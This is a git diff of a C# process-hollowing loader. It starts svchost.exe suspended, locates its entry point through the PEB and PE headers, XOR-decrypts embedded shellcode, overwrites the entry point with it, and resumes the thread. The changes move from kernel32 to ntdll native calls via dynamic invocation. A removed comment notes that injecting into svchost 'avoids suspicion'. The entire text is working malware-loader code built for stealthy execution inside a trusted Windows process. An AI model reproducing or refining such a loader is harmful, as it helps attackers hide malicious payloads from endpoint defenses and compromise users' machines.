@@ -57,9 +57,9 @@ namespace Hollow
             Win32.UNICODE_STRING imagePath, currentDirectory, commandLine;
             imagePath = currentDirectory = commandLine = new Win32.UNICODE_STRING();
 
-            Win32.RtlInitUnicodeString(ref imagePath, "\\??\\C:\\Windows\\System32\\calc.exe");
+            Win32.RtlInitUnicodeString(ref imagePath, "\\??\\C:\\Windows\\System32\\svchost.exe");
             Win32.RtlInitUnicodeString(ref currentDirectory, "C:\\Windows\\System32");
-            Win32.RtlInitUnicodeString(ref commandLine, "C:\\Windows\\System32\\calc.exe");
+            Win32.RtlInitUnicodeString(ref commandLine, "C:\\Windows\\System32\\svchost.exe");
 
             var processParams = IntPtr.Zero;
 
@@ -102,113 +102,165 @@ namespace Hollow
             {
                 Console.WriteLine("[!] Failed to create svchost process :(");
             }
-
-            Console.WriteLine(hProcess);
-            Console.WriteLine(hThread);
             
             Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
-            var address = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
-            var zwQueryInformationProcess = (Win32.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.ZwQueryInformationProcess));
+            var address = Generic.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
+            var ntQueryInformationProcess = (Win32.NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.NtQueryInformationProcess));
 
-            int res = zwQueryInformationProcess(
+            int res = ntQueryInformationProcess(
                 hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp
                 );
 
             if (res == 0)
             {
-                Console.WriteLine("[*] Got process information using ZwQueryInformationProcess...");
+                Console.WriteLine($"[*] Got process information using NtQueryInformationProcess [PID: {bi.UniquePid}]");
             }
             else
             {
-                Console.WriteLine("[!] Failed to get process information using ZwQueryInformationProcess :(");
+                Console.WriteLine("[!] Failed to get process information using NtQueryInformationProcess :(");
                 return;
             }
 
-            byte[] addrBuf = new byte[IntPtr.Size];
-            IntPtr nRead = IntPtr.Zero;
+            // 8 -> Image base address size in x64?
+            var addrSize = IntPtr.Size;
+
+            // IntPtr to buf address with addrSize
+            // https://learn.microsoft.com/en-us/dotnet/api/system.intptr.topointer?view=net-7.0
+            byte[] addrBuf = new byte[addrSize];
+
+            // n * bytes read
+            uint nRead = 0;
+
+            // Offset to image base in ntdll.h
+            // 16 bytes from the base of the PEB
+            // BOOL * 4  (8-bytes) -> HANDLE (8-bytes) -> ImageBase 
             IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+            
+            // Resolve NtReadVirtualMemory address in ntdll
+            var rpmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtReadVirtualMemory");
+            var NtReadProcessMemory = (Win32.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.NtReadVirtualMemory));
 
-            var rpmAddress = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
-            var readProcessMemory = (Win32.ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.ReadProcessMemory));
-
-            var r1 = readProcessMemory(
-                    hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead
+            var r1 = NtReadProcessMemory(
+                    hProcess, ptrToImageBase, addrBuf, (uint)addrSize, ref nRead
                 );
 
-            if (!r1)
+            if (r1 != Win32.NTSTATUS.Success)
             {
-                Console.WriteLine("[!] Failed to ReadProcessMemory on the first try :(");
+                Console.WriteLine("[!] Failed to NtReadVirtualMemory on the first try :(");
                 return;
             }
-
-            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-            Console.WriteLine($"[*] Obtained base of svchost.exe (0x{svchostBase.ToString("x")})");
-
+            
+            IntPtr svcHostBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
+            Console.WriteLine($"[*] Read bytes using NtReadVirtualMemory to obtain base address of svchost.exe [Base: 0x{svcHostBase.ToString("x")}]");
+           
+            // Allocate the next portion to read from svchost process
             byte[] data = new byte[0x200];
 
-            var r2 = readProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+            // Read 200 bytes from the base of svchost.exe and store in the data buffer
+            var r2 = NtReadProcessMemory(
+                hProcess, svcHostBase, data, (uint)data.Length, ref nRead
+                );
 
-            if (!r2)
+            if (r2 != Win32.NTSTATUS.Success)
             {
                 Console.WriteLine("[!] Failed to ReadProcessMemory on the second try :(");
                 return;
             }
 
+            // e_lfanew is always at base + 0x3C (60)
             uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+
+            // First we have a 4-byte signature 0x4550 (PE)
+            // Then the COFF header starts with two bytes to check OS architecture (0x8664 == 64-bit)
+            // Then a further 20 bytes including size of optional header, characteristics, etc
+            // 24-bytes (0xC) later we're at the Optional Header 
+            // Then we need to get to the AddressOfEntryPoint which is at offset 16 inside the Optional Header
+            // So 24-bytes + 16-bytes lands us at the AddressOfEntryPoint in the virtual address space of our target process (0x28 == 40dec)
             uint opthdr = e_lfanew_offset + 0x28;
             uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+            Console.WriteLine($"[*] Found relative virtual address of entry point in svchost.exe [RVA: 0x{entrypoint_rva:x})]");
 
-            // Add the address of svchost base to the entry point calculated by adding the offset of the optional header to our base data address
-            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
-            Console.WriteLine($"[*] Found address of Entry Point (0x{addressOfEntryPoint.ToString("x")})");
-
+            // Now we get the actual address of entry point by adding the calculated RVA to the base address of our target process
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svcHostBase);
+            Console.WriteLine($"[*] Found address of entry point [Entry Point: 0x{addressOfEntryPoint.ToString("x")}]");
+            
             // Decryption Routine
             for (int i = 0; i < shellcode.Length; i++)
             {
                 shellcode[i] = (byte)(shellcode[i] ^ k[i % k.Length]);
             }
 
-            //Write shellcode into the processes execution instructions
-            var writeProcMemParameters = new object[]
-            {
-                hProcess, addressOfEntryPoint, shellcode, shellcode.Length, nRead
-            };
-            var writeCheck = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);
+            /**
+            // Load NtWriteVirtualMemory into the program from ntdll
+            var wpmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");
+            var ntWriteVirtualMemory = (Win32.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(Win32.NtWriteVirtualMemory));
+            uint nbRead = 0;
 
-            if (!writeCheck)
+            // https://stackoverflow.com/questions/537573/how-to-get-intptr-from-byte-in-c-sharp
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
+            Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
+
+            // Write shellcode into the process execution instructions
+            var writeCheck = ntWriteVirtualMemory(
+                // Handle to svchost
+                hProcess, 
+                // Address of entry point into svchost
+                addressOfEntryPoint,
+                // Our shellcode, length, and (n) bytes written 
+                unmanagedPointer, 
+                (uint)shellcode.Length + 1, 
+                ref nbRead
+            );
+
+            if (writeCheck != Win32.NTSTATUS.Success)
             {
-                Console.Write("[!] Failed to write to remote svchost process!");
+                Console.Write($"[!] Failed to write to remote svchost process. [Error: {writeCheck}]");
                 return;
             }
-            else
-            {
-                Console.WriteLine("[*] Performed remote process write into svchost...");
-            }
+            Marshal.FreeHGlobal(unmanagedPointer);
+            **/
+
+            var wpmAddress = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+            var writeVirtualMemory = (Win32.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(Win32.WriteProcessMemory));
+            uint nbRead = 0;
+
+            // https://stackoverflow.com/questions/537573/how-to-get-intptr-from-byte-in-c-sharp
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
+            Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
+
+            // Write shellcode into the process execution instructions
+            var writeCheck = writeVirtualMemory(
+                // Handle to svchost
+                hProcess,
+                // Address of entry point into svchost
+                addressOfEntryPoint,
+                // Our shellcode, length, and (n) bytes written 
+                unmanagedPointer,
+                (uint)shellcode.Length,
+                ref nbRead
+            );
+
+            Marshal.FreeHGlobal(unmanagedPointer);
 
             //Since the thread is suspended, we resume rather than execute it
-            //Hopefully avoids suspicion more than previous methods, as this is a trusted process that communicates over networks regularly
             var resThreadParameters = new object[]
             {
-                hThread
+                hThread,
+                (uint)0
             };
 
-            uint resumeCheck = (uint)Generic.DynamicAPIInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
-            if (resumeCheck > 1)
+            // Resume the thread, print corresponding return code to check for issues
+            Win32.NTSTATUS resumeCheck = (Win32.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtResumeThread", typeof(Win32.NtResumeThread), ref resThreadParameters);
+            if (resumeCheck != Win32.NTSTATUS.Success)
             {
-                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended! Returned value: {resumeCheck}!");
+                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended. [Returned value: {resumeCheck}]");
                 return;
-            }
-            else if (resumeCheck == 0)
-            {
-                Console.WriteLine($"[!] No idea how we got here. Thread appears to have not been suspended in the first place! Returned value: {resumeCheck}");
             }
             else
             {
-                Console.WriteLine($"[*] Resumed thread successfully! Returned value: {resumeCheck}!");
+                Console.WriteLine($"[*] Resumed thread successfully. [Returned value: {resumeCheck}]");
             }         
-            
-            
         }
     }
 }
